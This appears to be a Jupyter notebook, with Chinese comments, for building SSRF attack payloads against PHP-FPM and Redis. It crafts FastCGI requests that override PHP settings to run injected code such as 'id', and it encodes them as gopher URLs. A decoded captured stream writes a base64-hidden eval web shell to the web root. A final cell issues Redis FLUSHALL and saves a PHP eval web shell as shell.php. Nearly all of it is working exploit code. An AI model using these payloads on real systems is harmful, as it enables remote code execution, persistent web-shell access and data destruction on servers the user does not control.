In [1]:
# 启用 autoreload 扩展
%load_ext autoreload

# 设置自动重新加载模式
%autoreload 2

In [2]:
import fastcgi as fcgi
from gopher import gopher_bytes
import urllib.parse as urlparse

documentRoot = "/"
uri = "/var/www/html/index.php"
content = b"<?php echo `id`; die('GOOD!'); ?>"

client = fcgi.FastCGIClient()
client.request_id = 1
client.begin_request()
client.send_params(
{
        'SERVER_SOFTWARE': 'go / fcgiclient ',
        'REMOTE_ADDR': '127.0.0.1',
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_LENGTH': "%d" % len(content),
        'REQUEST_METHOD': 'POST',
        'PHP_ADMIN_VALUE': 'allow_url_include = On\ndisable_functions = ',
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'DOCUMENT_ROOT': documentRoot
}
)

client.send_post(content)
# print(client.message)
# print(urlparse.quote(gopher_bytes("127.0.0.1:9000", client.message)))

# stream = "%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH136%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%88%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgQGV2YWwoJF9QT1NUWydtb295dWFuJ10pOz8%2B%20%7C%20base64%20-d%20%3E/var/www/html/ljn.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00"

# bts = urlparse.unquote_to_bytes(stream)
# # print(client.message)
# # print(bts)

# res = client.receive_stream(bts)

with open("payload.bin", "wb") as file:
    file.write(client.message)



In [28]:
res

[FCGI_Record(version=1, type=1, requestId=1, contentLength=8, paddingLength=0),
 FCGI_Record(version=1, type=4, requestId=1, contentLength=261, paddingLength=5),
 FCGI_Record(version=1, type=4, requestId=1, contentLength=0, paddingLength=0),
 FCGI_Record(version=1, type=5, requestId=1, contentLength=136, paddingLength=4)]

In [29]:
index = 0
reses = []
while index < res[1].contentLength:
    r, l = fcgi.FCGINameValuePair.unpack(res[1].content[index:])
    reses.append(r)
    index += l

In [30]:
reses[7].value

b'/'

In [31]:
reses

[FCGI_NameValuePair(name='SERVER_SOFTWARE'[15], value='go / fcgiclient '[16]),
 FCGI_NameValuePair(name='REMOTE_ADDR'[11], value='127.0.0.1'[9]),
 FCGI_NameValuePair(name='SERVER_PROTOCOL'[15], value='HTTP/1.1'[8]),
 FCGI_NameValuePair(name='CONTENT_LENGTH'[14], value='136'[3]),
 FCGI_NameValuePair(name='REQUEST_METHOD'[14], value='POST'[4]),
 FCGI_NameValuePair(name='PHP_VALUE'[9], value='allow_url_include = ...'[75]),
 FCGI_NameValuePair(name='SCRIPT_FILENAME'[15], value='/var/www/html/index....'[23]),
 FCGI_NameValuePair(name='DOCUMENT_ROOT'[13], value='/'[1])]

In [20]:
res[3].content

b"<?php system('echo PD9waHAgQGV2YWwoJF9QT1NUWydtb295dWFuJ10pOz8+ | base64 -d >/var/www/html/ljn.php');die('-----Made-by-SpyD3r-----\n');?>"

In [1]:
from gopher import gopher_http

gopher_http("127.0.0.1:6379",
"""FLUSHALL
SET shell "<?php @eval($_POST['cmd']); ?>"
CONFIG SET DIR /var/www/html
CONFIG SET DBFILENAME shell.php
SAVE
QUIT
""")

'gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20shell%20%22%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20/var/www/html%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT%0D%0A'